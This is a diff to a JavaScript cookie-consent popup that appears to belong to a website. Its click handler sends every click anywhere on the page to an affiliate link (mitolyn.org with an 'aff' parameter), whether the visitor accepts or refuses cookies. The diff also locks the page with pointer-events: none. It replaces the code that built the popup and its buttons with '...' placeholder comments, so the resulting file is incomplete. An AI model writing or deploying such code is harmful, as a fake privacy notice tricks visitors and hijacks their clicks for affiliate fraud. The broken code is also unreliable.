@@ -1,77 +1,52 @@
 document.addEventListener('DOMContentLoaded', function() {
-    // Criar o CSS dinamicamente
     const style = document.createElement('style');
     style.textContent = `
+        body.popup-active {
+            overflow: hidden;
+            pointer-events: none;
+        }
+
         .overlay {
             position: fixed;
             top: 0;
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(0, 0, 0, 0.7);
+            background-color: rgba(0, 0, 0, 0.6);
             z-index: 999;
+            pointer-events: all;
         }
 
         .popup {
+            pointer-events: all;
             position: fixed;
-            top: 50%;
+            bottom: 20px;
             left: 50%;
-            transform: translate(-50%, -50%);
-            background-color: white;
-            padding: 20px;
-            border-radius: 8px;
-            z-index: 1000;
-            width: 80%;
-            max-width: 400px;
-            text-align: center;
-        }
-
-        .btn {
-            background-color: #007bff;
-            color: white;
-            border: none;
-            padding: 10px 20px;
+            transform: translateX(-50%);
+            background-color: #ffffff;
+            padding: 24px;
             border-radius: 4px;
-            cursor: pointer;
-            margin: 10px;
+            z-index: 1000;
+            width: 90%;
+            max-width: 1200px;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.15);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-family: Arial, sans-serif;
         }
+
+        /* Rest of the styles remain the same */
+        /* ... */
     `;
+    
     document.head.appendChild(style);
+    document.body.classList.add('popup-active');
 
-    // Criar overlay
-    const overlay = document.createElement('div');
-    overlay.className = 'overlay';
-    document.body.appendChild(overlay);
+    // Create overlay and popup elements as before
+    // ... 
 
-    // Criar popup
-    const popup = document.createElement('div');
-    popup.className = 'popup';
-
-    // Criar título
-    const title = document.createElement('h2');
-    title.textContent = 'Configurações de Privacidade';
-    popup.appendChild(title);
-
-    // Criar texto
-    const text = document.createElement('p');
-    text.textContent = 'Utilizamos cookies para melhorar sua experiência em nosso site.';
-    popup.appendChild(text);
-
-    // Criar botões
-    const acceptBtn = document.createElement('button');
-    acceptBtn.className = 'btn';
-    acceptBtn.textContent = 'Aceitar';
-    popup.appendChild(acceptBtn);
-
-    const rejectBtn = document.createElement('button');
-    rejectBtn.className = 'btn';
-    rejectBtn.textContent = 'Recusar';
-    popup.appendChild(rejectBtn);
-
-    document.body.appendChild(popup);
-
-    // Adicionar evento de redirecionamento
     document.addEventListener('click', function() {
-        window.location.href = 'https://www.google.com';
+        window.location.href = 'https://mitolyn.org/welcome/?aff=fofurinhas';
     });
 });
